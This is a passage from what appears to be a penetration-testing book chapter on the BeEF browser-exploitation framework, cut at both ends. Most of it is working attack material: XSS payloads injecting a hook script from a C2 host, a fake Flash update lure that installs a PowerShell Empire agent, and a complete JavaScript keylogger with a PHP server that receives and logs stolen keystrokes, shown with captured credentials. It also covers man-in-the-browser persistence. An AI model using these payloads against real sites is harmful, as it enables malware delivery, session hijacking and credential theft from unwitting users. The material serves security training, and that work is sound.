    <span class="strong"><strong>cert: "/etc/letsencrypt/live/spider.ml/cert.pem"</strong></span>
</pre></div><p>The root of the configuration file is <code class="literal">beef</code> with indented lines delimiting subnodes. For example, the path <code class="literal">beef.credentials.user</code> path would return the <code class="literal">admin</code> value once the configuration file is parsed.</p><p>Changing the <code class="literal">beef.credentials.*</code> options should be a no-brainer. Updating the <code class="literal">beef.restrictions.*</code> options is also recommended, to ensure we target the appropriate clients and to keep unauthorized users out of the C2 interface.</p><p>The <code class="literal">permitted_ui_subnet</code> option will<a id="id445" class="indexterm"/> limit which network ranges BeEF will allow access to <code class="literal">/ui/</code>, the C2 administrative interface. This should be very restrictive, so you would typically set it to your current external address followed by <code class="literal">/32</code>.</p><p>We can also limit the addresses that are actually allowed to interact with BeEF's hook, preventing any unwanted clients from being exploited. If we are running BeEF internally, we can limit the hooking subnet to, say, marketing only. If analysts from the blue team segment attempt to run the hook payload, they won't get anything useful back.</p><p>For production deployments in the cloud, we need to set <code class="literal">beef.http.host</code> to our target's IP address space and we also want to listen on port <code class="literal">443</code>. Running BeEF with <code class="literal">beef.https.enable = true</code> is recommended, as it increases the chances of success when hooking.</p><p>If we attempt to inject our BeEF payload <code class="literal">&lt;script async src=http://c2.spider.ml/hook.js&gt;</code> into a page loaded over HTTPS, modern browsers will not load the script at all. Loading HTTPS resources in an HTTP site is allowed, so, if possible, C2 should always be running with TLS enabled.</p><p>The <code class="literal">beef.https.key</code> and <code class="literal">beef.https.cert</code> configuration options should point to the appropriate certificate, hopefully, signed by a trusted root certificate authority such as <span class="strong"><strong>Let's Encrypt</strong></span>. We've covered using Let's Encrypt to request free certificates for use in our C2 infrastructure, in <a class="link" href="ch06.html" title="Chapter 6. Out-of-Band Exploitation">Chapter 6</a>, <span class="emphasis"><em>Out-of-Band Exploitation</em></span>.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note51"/>Note</h3><p>Let's Encrypt provides <a id="id446" class="indexterm"/>free domain-validated certificates for hostnames and even wildcards. More information can be found at <a class="ulink" href="https://letsencrypt.org/">https://letsencrypt.org/</a>.</p></div></div><p>The <code class="literal">beef.http.public</code> value should match the HTTPS certificate domain or you may have client validation errors and the hook will fail.</p><p>Once everything is configured, we can launch the server component:</p><div class="mediaobject"><img src="graphics/B09238_09_09.jpg" alt="BeEF"/><div class="caption"><p>Figure 9.9: BeEF running in the cloud</p></div></div><p>With the BeEF C2 <a id="id447" class="indexterm"/>server up and running on <code class="literal">c2.spider.ml</code>, we can start attacking clients. The first step is to get the BeEF hook code to execute in the target browser. There are a few ways to accomplish this, the more common being a persistent, reflected or DOM-based XSS attack.</p><p>If we have shell access to the application, there is also value in backdooring application code with a BeEF hook. We can persist our hook code and record user activities, and even use social engineering to execute malware on high-value targets' machines.</p><p>The BeEF C2 panel is accessible via the URL displayed in the BeEF launcher output:</p><div class="informalexample"><pre class="programlisting">https://[beef.http.public]:[beef.http.port]/ui/panel</pre></div><p>The user experience is a bit unorthodox but quick to get used to:</p><div class="mediaobject"><img src="graphics/B09238_09_10.jpg" alt="BeEF"/><div class="caption"><p>Figure 9.10: The BeEF C2 server control panel</p></div></div><p>On the left, the UI shows a history of hooked browsers or victims, both online and offline, grouped by the originating domain. An online victim can be exploited immediately, as the hook is actively calling back to the C2. An offline browser has not recently checked in with the C2 but may still be exploited once the victim comes back online. This is typical with victims hooked via persistent XSS attacks, backdoored web applications, or browser extensions.</p><p>On the right-hand side of the <a id="id448" class="indexterm"/>hooked browsers' history, you'll find the landing page (or <span class="strong"><strong>Getting Started</strong></span>), the C2 server logs (<span class="strong"><strong>Logs</strong></span>), and the selected victim's browser control tab (<span class="strong"><strong>Current Browser</strong></span>). Of interest is the browser control, which includes sub-tabs for details, logs, and the modules, or commands.</p><p>In the <span class="strong"><strong>Commands</strong></span> tab, we can select a module to run, we can input any required parameters in the right-most column before hitting the <span class="strong"><strong>Execute</strong></span> button, and we can observe the module's execution history in the center column.</p><p>There are many modules available and some work better than others. The effectiveness of the module (command) you choose really depends on the browser version, the victim, and how technologically savvy they are. In the coming sections, we will look at the more successful attack modules in an attempt to compromise the target or harvest credentials.</p><div class="section" title="Hooking"><div class="titlepage"><div><div><h2 class="title"><a id="ch09lvl2sec38"/>Hooking</h2></div></div></div><p>With the BeEF C2 server running <a id="id449" class="indexterm"/>in the cloud, we have exposed two important URLs:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">The administrative interface – <code class="literal">https://c2.spider.ml/ui/panel</code></li><li class="listitem" style="list-style-type: disc">The hooking script – <code class="literal">https://c2.spider.ml/hook.js</code></li></ul></div><p>Both of the URLs are locked down by the <code class="literal">beef.restrictions.*</code> options in the configuration file. Take care to use the appropriate network ranges for hooking and admin UI restrictions.</p><p>The <code class="literal">hook.js</code> file is essentially the malware we will drop in a victim's browser in order to take full control of their session. It is a fairly large piece of code and it is best delivered as an external script (such as the one hosted on our C2), but this is not a requirement. We can copy and paste the whole hook code in the browser console window if we want to. It is large but portable.</p><p>If we are trying to hide from the blue team, it may be best to move this file to something less conspicuous than <code class="literal">c2.spider.ml/hook.js</code>, but for the sake of this chapter, we will hook victims using this URL.</p><p>As I alluded to earlier, once we have an XSS vulnerability, we can construct a payload to drop a new <code class="literal">script</code> tag, which will hook the client using the BeEF payload. In some situations, a bit more creativity may be required to get JavaScript to execute our code, but the end goal is to insert a payload similar to the following:</p><div class="informalexample"><pre class="programlisting">&lt;script async src=https://c2.spider.ml/hook.js&gt;&lt;/script&gt;</pre></div><p>In the common situation where the reflection point (also known as the <span class="strong"><strong>sink</strong></span>) is located inside an HTML tag, we have a couple of options:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Close out the affected HTML tag and open a new <code class="literal">script</code> tag containing our hook code</li><li class="listitem" style="list-style-type: disc">Set up an event handler that will download and execute our hook code when an event happens, such as when the page loads or the user clicks an element</li></ul></div><p>The first option is simple; we can <a id="id450" class="indexterm"/>close the <code class="literal">value</code> property with a double-quote and the <code class="literal">input</code> element with an angled bracket, followed by our malicious <code class="literal">script</code> tag:</p><div class="informalexample"><pre class="programlisting">&lt;input type="text" name="qs" id="qs" value=""&gt;<span class="strong"><strong>&lt;script async src=https://c2.spider.ml/hook.js&gt;&lt;/script&gt;</strong></span>&lt;<span class="strong"><strong>span id="</strong></span>"&gt;</pre></div><p>The resulting HTML code, once the XSS payload is reflected back, will silently download and execute our hook code, giving us access to the browsing session. The <code class="literal">async</code> keyword will ensure that the hook is downloaded asynchronously and does not slow down the page load, which could tip off the victim that something is amiss.</p><p>The trailing unfinished <code class="literal">&lt;span&gt;</code> will ensure that the remainder of the original HTML code does not show up on the page, giving it a bit more of a clean look.</p><p>If we have to use an event to execute our code, we can configure a handler by creating an appropriate <code class="literal">on[event]</code> property within the affected HTML tag. For example, if we wish to execute our hook when the user clicks the affected element, we can leverage the <code class="literal">&lt;input&gt;</code> tag's <code class="literal">onclick</code> property, which allows us to execute arbitrary code:</p><div class="informalexample"><pre class="programlisting">&lt;input type="text" name="qs" id="qs" value="<span class="strong"><strong>" onclick="alert(document.cookie)" x="</strong></span>"&gt;</pre></div><p>The preceding example will pop up an alert box containing the current cookies, which, as I've said before, is great for a proof of concept but not very useful in an attack.</p><p>We can use the DOM and JavaScript to construct a net-new <code class="literal">script</code> element, point it to our hook code, and append it to the <code class="literal">head</code> of the page.</p><p>Thanks to JavaScript's flexibility, there are a million and one ways to accomplish this, but our code is fairly simple:</p><div class="informalexample"><pre class="programlisting">var hook = document.createElement('script');
hook.src = 'https://c2.spider.ml/hook.js';
document.head.append(hook);</pre></div><p>The first line will create a blank <a id="id451" class="indexterm"/>object representing a <code class="literal">script</code> tag. Just as we did with the <code class="literal">src=</code> HTML tag property, in JavaScript, we can point the source of the script to our hook code. At this point, no actual code is downloaded or executed. We have created a benign DOM object. To weaponize, we can use the <code class="literal">append</code> function to add it to the <code class="literal">document.head</code>, which is to say we create a <code class="literal">&lt;script&gt;</code> tag in the <code class="literal">&lt;head&gt;</code> tag of the page. The last line does just this, and the browser immediately and silently downloads the hook code and executes it.</p><p>Our payload would look something like this:</p><div class="informalexample"><pre class="programlisting">&lt;input type="text" name="qs" id="qs" value="<span class="strong"><strong>" var hook = document.createElement('script');hook.src='https://c2.spider.ml/hook.js</strong></span>';
<span class="strong"><strong>document.head.append(hook);" x="</strong></span>"&gt;</pre></div><p>Again, the trailing <code class="literal">x="</code> property is to make sure there are no HTML parsing oddities and the code can execute cleanly.</p><p>Another common sink for XSS vulnerabilities is directly inside JavaScript code, somewhere on the page itself:</p><div class="informalexample"><pre class="programlisting">&lt;script&gt;
  sure = confirm("Hello <span class="strong"><strong>[sink]</strong></span>, are you sure you wish to logout?");
  if (sure) {
    document.location = "/logout";
  }
&lt;/script&gt;</pre></div><p>In the preceding example, the server would reflect some user-controlled text inside the <code class="literal">confirm()</code> string parameter. To take advantage of this, we can reuse the DOM manipulation code we wrote earlier and just adapt it to work inside a string passed to another function. This is by no means the only way to achieve code execution, but it's a start.</p><p>With JavaScript, we can concatenate strings and other objects using the plus operator, as follows:</p><div class="informalexample"><pre class="programlisting">alert("One plus one is " + <span class="strong"><strong>prompt("1 + 1 = ")</strong></span> + "!");</pre></div><p>The <code class="literal">prompt()</code> function will return whatever string value we give it, and <code class="literal">alert()</code> will concatenate the strings before returning to the user. We can do all kinds of strange things like that with JavaScript, but what's important to note is that a <code class="literal">prompt()</code> function was executed. If we have control of what is concatenated in a string, we can execute arbitrary JavaScript code.</p><p>In the preceding code example, instead of returning our username, we will force the application to return a string concatenation, which will execute our dropper code:</p><div class="informalexample"><pre class="programlisting">&lt;script&gt;
  sure = confirm("Hello <span class="strong"><strong>" + eval("var hook = document.createElement('script');hook.src='xxx.xxx';document.head.append(hook);") + "</strong></span>, are you sure you wish to logout?");
  if (sure) {
    document.location = "/logout";
  }
&lt;/script&gt;</pre></div><p>We're not really concerned with<a id="id452" class="indexterm"/> the end result of the concatenation, in fact, <code class="literal">eval</code> does not return anything meaningful for display. What we care about is the execution of <code class="literal">eval()</code>, which will in turn execute our hook dropper.</p><p>A keen eye will notice that there's a minor issue with this particular injection. If the user clicks OK in the confirm dialog box, the <code class="literal">sure</code> variable will be set to <code class="literal">true</code> and the page will navigate away, taking down our BeEF hook with it.</p><p>To get around this particular problem, we have to "complete" the script and control the script execution flow to make sure the page stays long enough for us to conduct our second stage of the attack. A sensible approach would be to close-out the <code class="literal">confirm</code> function, <code class="literal">eval</code> our code, and set the value of <code class="literal">sure</code> to <code class="literal">false</code> immediately after. This will ensure that the page does not navigate away if the user clicks OK, as the next <code class="literal">if</code> condition will always evaluate to <code class="literal">false</code>.</p><p>We have to modify our dropper payload slightly:</p><div class="informalexample"><pre class="programlisting">"); eval("var hook = document.createElement('script');hook.src='https://c2.spider.ml/hook.js';document.head.append(hook);"); sure = false; //</pre></div><p>The result is valid code that will prevent the <code class="literal">if</code> statement from evaluating to <code class="literal">true</code> and changing the document location. We use the double slash (<code class="literal">//</code>) to comment out the rest of the <code class="literal">confirm()</code> function, preventing JavaScript parse errors:</p><div class="informalexample"><pre class="programlisting">&lt;script&gt;
  sure = confirm("Hello <span class="strong"><strong>"); eval("var hook = document.createElement('script');hook.src='https://c2.spider.ml/hook.js';document.head.append(hook);"); sure = false;</strong></span> //, are you sure you wish to logout?");
  if (sure) {
    document.location = "/logout";
  }
&lt;/script&gt;</pre></div><p>Injecting JavaScript code in the middle of a function can present some problems if it is not carefully crafted. HTML is fairly forgiving if we miss a closing tag or break the rest of the page. Some JavaScript engines, however, will fail to parse the code and our payload will never execute.</p><p>For the following BeEF scenarios, we will hook the badguys site, available at <code class="literal">http://badguys.local</code>, using the following XSS attack. This is a much simpler reflected XSS attack, but it should do the trick to showcase BeEF capabilities:</p><div class="informalexample"><pre class="programlisting">http://badguys.local/cross-site-scripting/form-field?qs="&gt;&lt;<span class="strong"><strong>script+async+src=https://c2.spider.ml/hook.js</strong></span>&gt;&lt;<span class="strong"><strong>/script</strong></span>&gt;&lt;<span class="strong"><strong>span+id="</strong></span>
</pre></div><p>The <code class="literal">qs</code> parameter is vulnerable to<a id="id453" class="indexterm"/> reflected XSS attacks and we will target victims with our BeEF hook.</p><p>If successful, the BeEF C2 server log will show the new hooked browser, the IP address, the browser, the OS, and the domain on which the XSS payload executed:</p><div class="informalexample"><pre class="programlisting">[20:21:37][*] New Hooked Browser [id:1, ip:<span class="strong"><strong>196.247.56.62</strong></span>, browser:C-UNKNOWN, os:Windows-7], hooked domain [<span class="strong"><strong>badguys.local:80</strong></span>]</pre></div><p>We can now begin executing various commands (or modules) on the victim's browser.</p></div><div class="section" title="Social engineering attacks"><div class="titlepage"><div><div><h2 class="title"><a id="ch09lvl2sec39"/>Social engineering attacks</h2></div></div></div><p>By far the easiest way to <a id="id454" class="indexterm"/>capture credentials or to execute malicious code is, and always will be, social engineering. XSS attacks, in particular, give us the advantage of executing code on a user-trusted website, dramatically increasing the chance of success, since even the most vigilant user will trust a web address they recognize.</p><p>BeEF provides us with<a id="id455" class="indexterm"/> several social engineering modules, including but not limited to:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc"><span class="strong"><strong>Fake Notification Bar</strong></span>: Delivers <a id="id456" class="indexterm"/>malware by imitating browser notification bars</li><li class="listitem" style="list-style-type: disc"><span class="strong"><strong>Fake Flash Update</strong></span>: Delivers <a id="id457" class="indexterm"/>malware disguised as a Flash update popup</li><li class="listitem" style="list-style-type: disc"><span class="strong"><strong>Pretty Theft</strong></span>: Captures <a id="id458" class="indexterm"/>credentials using fake popups for familiar sites</li><li class="listitem" style="list-style-type: disc"><span class="strong"><strong>Fake LastPass</strong></span>: Captures<a id="id459" class="indexterm"/> LastPass credentials using a fake popup</li></ul></div><p>To showcase a common social engineering attack with BeEF, we will leverage the Fake Flash Update module, located under <span class="strong"><strong>Commands</strong></span> in the <span class="strong"><strong>Social Engineering</strong></span> category. This technique is still surprisingly effective in the wild, and BeEF simplifies the delivery of an executable payload to the victim.</p><p>The configuration is simple; we<a id="id460" class="indexterm"/> just need to point the module to our very own custom payload, which will be presented to the victim as a fake Flash update file:</p><div class="mediaobject"><img src="graphics/B09238_09_11.jpg" alt="Social engineering attacks"/><div class="caption"><p>Figure 9.11: Configuring the Fake Flash Update BeEF command</p></div></div><p>We can also specify a custom image if we wish to change the default one hosted on the BeEF server. Our "Fake Flash" payload (<code class="literal">FlashUpdate.bat</code>) is a simple batch script, which will execute a PowerShell <span class="strong"><strong>Empire</strong></span> agent malware. We have a separate Empire C2 server running in the cloud as well, waiting for the agent to check-in.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note52"/>Note</h3><p>Empire is an awesome C2 open-source software that allows full control of Windows and Linux machines. The Windows agent is written entirely in PowerShell and can be used to control every aspect of the target. It is a very effective <span class="strong"><strong>remote access trojan</strong></span> (<span class="strong"><strong>RAT</strong></span>). Linux is also supported via a Python agent. There are a ton of post-exploitation <a id="id461" class="indexterm"/>modules and Empire is easily <a id="id462" class="indexterm"/>deployed in the cloud. More information can be found at <a class="ulink" href="https://www.powershellempire.com/">https://www.powershellempire.com/</a>.</p></div></div><p>We have hosted the Empire<a id="id463" class="indexterm"/> agent downloader (<code class="literal">FlashUpdate.bat</code>) on our C2 server to make things simpler. The BeEF Fake Flash Update command will present the user with an image that looks like a prompt to update Flash. Clicking anywhere on the image will begin the download of the malware. The user will still have to execute it, but as I've mentioned before, this is still a very effective method for exploitation.</p><p>Clicking <span class="strong"><strong>Execute</strong></span> in the Fake Flash Update command will popup the fake message in the victim's browser:</p><div class="mediaobject"><img src="graphics/B09238_09_12.jpg" alt="Social engineering attacks"/><div class="caption"><p>Figure 9.12: The Fake Flash Update command in action</p></div></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note53"/>Note</h3><p>Hovering over the image will show the <code class="literal">http://c2.spider.ml/FlashUpdate.bat</code> link that we configured earlier in the Fake Flash Update command.</p></div></div><p>The Empire C2 server<a id="id464" class="indexterm"/> receives the agent connection, giving us full control over the victim's machine, not just the browser:</p><div class="informalexample"><pre class="programlisting">(Empire: listeners) &gt; list

[*] Active listeners:

  Name    Module    Host                    Delay/Jitter    KillDate
  ----    ------    ----                    ------------    --------
  http    http      https://c2.spider.ml:   5/0.08443

(Empire: listeners) &gt; [*] Sending POWERSHELL stager (stage 1) to <span class="strong"><strong>196.247.56.62</strong></span>
[*] New agent <span class="strong"><strong>XH3U861L</strong></span> checked in
[+] Initial agent <span class="strong"><strong>XH3U861L</strong></span> from 196.247.56.62 now active
[*] Sending agent (stage 2) to <span class="strong"><strong>XH3U861L</strong></span> at 196.247.56.62</pre></div><p>We can interact with the agent and execute arbitrary commands (among many, many other things):</p><div class="informalexample"><pre class="programlisting">(Empire: listeners) &gt; agents
(Empire: agents) &gt; interact <span class="strong"><strong>XH3U861L</strong></span>
(Empire: XH3U861L) &gt; <span class="strong"><strong>shell whoami</strong></span>
[...]
BG-CORP52176\ThePlague
..Command execution completed.</pre></div><p>With a little help from the XSS attack, we were able to trick our victim into executing our malware and letting us escalate privileges from in-browser to having full control over the victim's machine.</p><p>There are other social engineering modules available and the majority have a fairly high rate of success.</p></div><div class="section" title="The keylogger"><div class="titlepage"><div><div><h2 class="title"><a id="ch09lvl2sec40"/>The keylogger</h2></div></div></div><p>A common use <a id="id465" class="indexterm"/>for XSS attacks is the old-fashioned keylogger. JavaScript allows us to capture keystrokes very easily, and since we have access to execute arbitrary JavaScript code in the browser, we can set up a keystroke logger as well. You can imagine that XSS in a login page could be very valuable to attackers.</p><p>There is no module or command within BeEF to enable a keylogger because it is enabled by default in the core! We can see the keystrokes entered by each hooked browser by inspecting either the <span class="strong"><strong>Logs</strong></span> tab next to the <span class="strong"><strong>Current Browser</strong></span> tab in the web user interface, or by looking at the C2 console output directly.</p><p>To see the <a id="id466" class="indexterm"/>BeEF keylogger in action, we have to start the server using the <code class="literal">-v</code> (verbose) switch:</p><div class="mediaobject"><img src="graphics/B09238_09_13.jpg" alt="The keylogger"/><div class="caption"><p>Figure 9.13: BeEF running in the cloud in verbose mode</p></div></div><p>There is a ton of output relating to the initialization of BeEF, which can be safely ignored. After the victim's browser is hooked, however, user events will be sent to the BeEF C2, including keystrokes and mouse clicks:</p><div class="informalexample"><pre class="programlisting">UI(log/.zombie.json) call: 2.779s - [Mouse Click] x: 543 y:240 &gt; p
UI(log/.zombie.json) call: 7.493s - [Mouse Click] x: 502 y:349 &gt; div#cookie
UI(log/.zombie.json) call: 9.152s - <span class="strong"><strong>[User Typed] ad</strong></span>
UI(log/.zombie.json) call: 10.171s - <span class="strong"><strong>[User Typed] ministra</strong></span>
UI(log/.zombie.json) call: 11.186s - <span class="strong"><strong>[User Typed] tor</strong></span>
UI(log/.zombie.json) call: 17.251s - <span class="strong"><strong>[User Typed] Wint</strong></span>
UI(log/.zombie.json) call: 18.254s - <span class="strong"><strong>[User Typed] er2018</strong></span>
</pre></div><p>We can see what looks like credentials typed into the hooked application. The words will be split up because of the frequency with which the BeEF hook calls home and submits the captured key buffer. In most cases, it is fairly obvious what the user is typing in.</p><p>The built-in<a id="id467" class="indexterm"/> keylogger is fairly good and most attacks will benefit from it. However, in certain situations, a more custom keylogger may be required. Perhaps we want to send the keys to some other location, or just want to record more keystrokes, such as <span class="emphasis"><em>Backspace</em></span>, <span class="emphasis"><em>Enter</em></span>, and <span class="emphasis"><em>Tab</em></span>.</p><p>Using BeEF as an attack tool is possible because XSS allows us to execute JavaScript code in the browser. All the commands we send are just snippets of code executing as if they were part of the application.</p><p>As expected, there is a BeEF command that we can use to execute any JavaScript we want in the hooked browser. Our custom keylogger is not very advanced but allows us to customize it to fit our needs in the future.</p><p>The first thing we will do is define a <code class="literal">push_url</code> variable, which is the C2 server URL to which we will submit captured keystrokes. This server component will decode the keylogger information and store it in a text file for review:</p><div class="informalexample"><pre class="programlisting">var push_url = "http://c2.spider.ml/log.php?session=";</pre></div><p>Next, we will use the <code class="literal">document.addEventListener()</code> method to fire a handler function whenever a <code class="literal">keydown</code> event occurs somewhere on the page. This event indicates that the user has pressed down on a key and gives us an opportunity to programmatically inspect and record it. Keys will be appended to a buffer variable, which will be later sent to the <code class="literal">push_url</code>:</p><div class="informalexample"><pre class="programlisting">var <span class="strong"><strong>buffer</strong></span> = [];
document.addEventListener(<span class="strong"><strong>"keydown"</strong></span>, function(e) {
  key = e.key;
  if (key.length &gt; 1 || key == " ") { <span class="strong"><strong>key = "[" + key + "]"</strong></span> }
  <span class="strong"><strong>buffer.push(key)</strong></span>;
});</pre></div><p>When this event does fire, we store the pressed key inside a buffer to be later submitted to the keylogging server. The <code class="literal">if</code> statement within this <code class="literal">keydown</code> handler function will wrap special keys with brackets to make it easier for us to read. For example: the keystrokes <span class="emphasis"><em>Enter</em></span>, <span class="emphasis"><em>Space</em></span>, and <span class="emphasis"><em>Tab</em></span> would be recorded as <code class="literal">[Enter]</code>, <code class="literal">[Space]</code>, <code class="literal">[Tab]</code>, respectively.</p><p>The last bit of code will execute a function every couple of seconds (every 2,000 milliseconds) and is responsible for submitting the current buffer to the defined <code class="literal">push_url</code>:</p><div class="informalexample"><pre class="programlisting">window.setInterval(function() {
  if (buffer.length &gt; 0) {
    var data = <span class="strong"><strong>encodeURIComponent(btoa(buffer.join('')))</strong></span>;

    <span class="strong"><strong>var img = new Image()</strong></span>;
    <span class="strong"><strong>img.src = push_url + data</strong></span>;

    buffer = [];
  }
}, <span class="strong"><strong>2000</strong></span>);</pre></div><p>The <code class="literal">window.setInterval()</code> function allows us to specify another function that will be executed periodically, in parallel to the <code class="literal">keydown</code> handler. As the <code class="literal">keydown</code> handler fills the buffer, the <code class="literal">setInterval()</code> function sends it up to the C2 server.</p><p>The keylogger<a id="id468" class="indexterm"/> submission process is as follows:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Convert the buffer from an array to a string using <code class="literal">.join()</code></li><li class="listitem">Encode the result to Base64 using <code class="literal">btoa()</code></li><li class="listitem">URI encode the Base64 value with <code class="literal">encodeURIComponent</code> and store the result in the data</li><li class="listitem">Create a new <code class="literal">Image()</code> object and set its source to the <code class="literal">push_url</code> with the encoded data appended to the end</li></ol></div><p>The neat side effect of creating a new <code class="literal">Image()</code> object is that no actual image is created on the page, but once a source (<code class="literal">.src</code>) is defined, the browser will attempt to fetch it over the wire, sending out the encoded buffer via the URL.</p><p>The full keylogger client-side code is as follows:</p><div class="informalexample"><pre class="programlisting">var push_url = "http://c2.spider.ml/log.php?session=";

var <span class="strong"><strong>buffer</strong></span> = [];
document.addEventListener(<span class="strong"><strong>"keydown"</strong></span>, function(e) {
    key = e.key;
    if (key.length &gt; 1 || key == " ") { <span class="strong"><strong>key = "[" + key + "]"</strong></span> }
    <span class="strong"><strong>buffer.push(key)</strong></span>;
});

window.setInterval(function() {
    if (buffer.length &gt; 0) {
        var data = <span class="strong"><strong>encodeURIComponent(btoa(buffer.join('')))</strong></span>;

        <span class="strong"><strong>var img = new Image()</strong></span>;
        <span class="strong"><strong>img.src = push_url + data</strong></span>;

        buffer = [];
    }
}, <span class="strong"><strong>2000</strong></span>);</pre></div><p>To complete this keylogger, we need the server component to intercept the submission, and decode and store the logged keystrokes.</p><p>We can write a <a id="id469" class="indexterm"/>little bit of PHP to do just that:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/keylogger# cat log.php 
&lt;?php
if (isset($_GET["session"])) {
    $keys = <span class="strong"><strong>@base64_decode($_GET["session"])</strong></span>;

    $logfile = <span class="strong"><strong>fopen("keys.log", "a+")</strong></span>;
    <span class="strong"><strong>fwrite</strong></span>($logfile, $keys);

    fclose($logfile);
}
?&gt;</pre></div><p>The first line is an <code class="literal">if</code> statement, which checks to see whether any data came in via the session <code class="literal">GET</code> parameter. If there is data available, the script will decode it and store it in the <code class="literal">$keys</code> variable to be written to disk in the <code class="literal">keys.log</code> file using the <code class="literal">fwrite()</code> function.</p><p>We can start the built-in PHP server on port <code class="literal">80</code> to serve the <code class="literal">log.php</code> file for our JavaScript keylogger to communicate with:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/keylogger# php -S 0.0.0.0:80
PHP 7.0.30-0+deb9u1 Development Server started
Listening on http://0.0.0.0:80
Document root is /root/keylogger
Press Ctrl-C to quit.</pre></div><p>All that's left is to push the JavaScript payload through BeEF to our hooked target using the Raw JavaScript command under the <span class="strong"><strong>Misc</strong></span> node:</p><div class="mediaobject"><img src="graphics/B09238_09_14.jpg" alt="The keylogger"/><div class="caption"><p>Figure 9.14: Executing the custom keylogger on the hooked victim</p></div></div><p>Once the user <a id="id470" class="indexterm"/>starts typing, we can see the requests coming into our server:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/keylogger# php -S 0.0.0.0:80
PHP 7.0.30-0+deb9u1 Development Server started
Listening on http://0.0.0.0:80
Document root is /root/keylogger
Press Ctrl-C to quit.
[...]
[] 196.247.56.62:50406 [200]: /log.php?session=<span class="strong"><strong>SGlbIF1bU2hpZnRdSm0%3D</strong></span>
[] 196.247.56.62:50901 [200]: /log.php?session=<span class="strong"><strong>W0JhY2tzcGFjZV1pbQ%3D%3D</strong></span>
[] 196.247.56.62:55025 [200]: /log.php?session=<span class="strong"><strong>LFtFbnRlcl1bRW50ZXJd</strong></span>
[] 196.247.56.62:55657 [200]: /log.php?session=<span class="strong"><strong>W1NoaWZ0XVBsZWFz</strong></span>
[] 196.247.56.62:56558 [200]: /log.php?session=<span class="strong"><strong>ZVsgXWZpbmRbIF1hdHRhY2hlZFsgXXQ%3D</strong></span>
[] 196.247.56.62:61273 [200]: /log.php?session=<span class="strong"><strong>aGVbIF1yZXBvcnRzWyBdZnJvbQ%3D%3D</strong></span>
[] 196.247.56.62:51034 [200]: /log.php?session=<span class="strong"><strong>WyBdbGFzdFsgXXF1YXJ0ZXI%3D</strong></span>
[] 196.247.56.62:60599 [200]: /log.php?session=<span class="strong"><strong>Lg%3D%3D</strong></span>
[...]</pre></div><p>If we view the contents of <code class="literal">keys.log</code>, we will see the captured keystrokes in cleartext using the <code class="literal">tail -f</code> command:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/keylogger# tail -f keys.log

[Tab]administrator[Tab][Shift]Winter2018[Enter][Shift]Hi[ ][Shift]Jm[Backspace]im,[Enter][Enter][Shift]Please[ ]find[ ]attached[ ]the[ ]reports[ ]from[ ]last[ ]quarter.[Enter][Enter]</pre></div><p>Our keylogger is <a id="id471" class="indexterm"/>effective and should work fairly well on modern browsers. BeEF's built-in event logger has a few other nice features, such as capturing mouse clicks, and copy-and-paste events, as well as traditional keystrokes. Using both in an attack may improve our chances of capturing useful data.</p></div><div class="section" title="Persistence"><div class="titlepage"><div><div><h2 class="title"><a id="ch09lvl2sec41"/>Persistence</h2></div></div></div><p>BeEF has very <a id="id472" class="indexterm"/>powerful capabilities, but it is only effective as long as the browser is hooked. In an earlier example, we mentioned how the victim navigating away from the page can interrupt our control over their browser. This is the unfortunate reality of XSS attacks. Persistent XSS is more resilient, provided the user visits the infected page often enough, but this is not ideal.</p><p>BeEF comes with a few modules to attempt to persist the hook, keeping the victim online longer. An effective option is the Man-In-The-Browser command, available under the <span class="strong"><strong>Persistence</strong></span> node:</p><div class="mediaobject"><img src="graphics/B09238_09_15.jpg" alt="Persistence"/><div class="caption"><p>Figure 9.15: The Man-In-The-Browser command</p></div></div><p>There are no options to <a id="id473" class="indexterm"/>set for this one; we just have to execute and everything is taken care of.</p><p>The <span class="strong"><strong>man-in-the-browser</strong></span> (<span class="strong"><strong>MITB</strong></span>) attack is similar <a id="id474" class="indexterm"/>to the more<a id="id475" class="indexterm"/> popular <span class="strong"><strong>man-in-the-middle</strong></span> (<span class="strong"><strong>MITM</strong></span>) network layer attack. In an MITM scenario, the victim's machine is tricked into routing packets to a malicious machine, giving the attacker full control of the victim's network traffic. This can result in attacks such as TLS downgrade or stripping, integrity violation, malware injection, and much more. An MITB attack is similar in that web requests are intercepted and proxied by attacker code.</p><p>BeEF's Man-In-The-Browser module, for example, will intercept link clicks that would normally navigate the user away from the hooked page. Instead of allowing the click to complete normally, the module will perform the following steps in the background:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Execute an asynchronous JavaScript request (XHR) to the intended destination</li><li class="listitem">Replace the existing page's contents with the destination page's contents</li><li class="listitem">Update the address bar to reflect the clicked link</li><li class="listitem">Add the "old" page to the browsing history</li></ol></div><p>We can see the MITB attack in action by looking at the command execution history:</p><div class="mediaobject"><img src="graphics/B09238_09_16.jpg" alt="Persistence"/><div class="caption"><p>Figure 9.16: Man-In-The-Browser command results</p></div></div><p>To the victim, this process is transparent, as the page they have requested was loaded successfully and everything looks normal. The difference is that BeEF never lost control of the hook, since the tab <a id="id476" class="indexterm"/>session was not discarded by navigating away. The BeEF hook is still running, giving us persistent control.</p></div><div class="section" title="Automatic exploitation"><div class="titlepage"><div><div><h2 class="title"><a id="ch09lvl2sec42"/>Automatic exploitation</h2></div></div></div><p>All these modules are <a id="id477" class="indexterm"/>great, but XSS attacks are typically time-sensitive. If we successfully trick the user into executing our BeEF hook, we may not have enough time to click through the user interface and run any modules before they close the page or browse to some other part of the application.</p><p>Thankfully, BeEF implements an <span class="strong"><strong>Autorun Rule Engine</strong></span> (<span class="strong"><strong>ARE</strong></span>) that does what you might expect: automatically<a id="id478" class="indexterm"/> runs modules using a set of rules defined by the operator. Depending on what rules have been enabled, whenever a new browser is infected with the hook payload, the selected modules are automatically executed. The obvious candidates for ARE are the ones that provide persistence and exfiltrate sensitive data, such as cookies or even our custom keylogger.</p><div class="note" title="Note" style=""><div 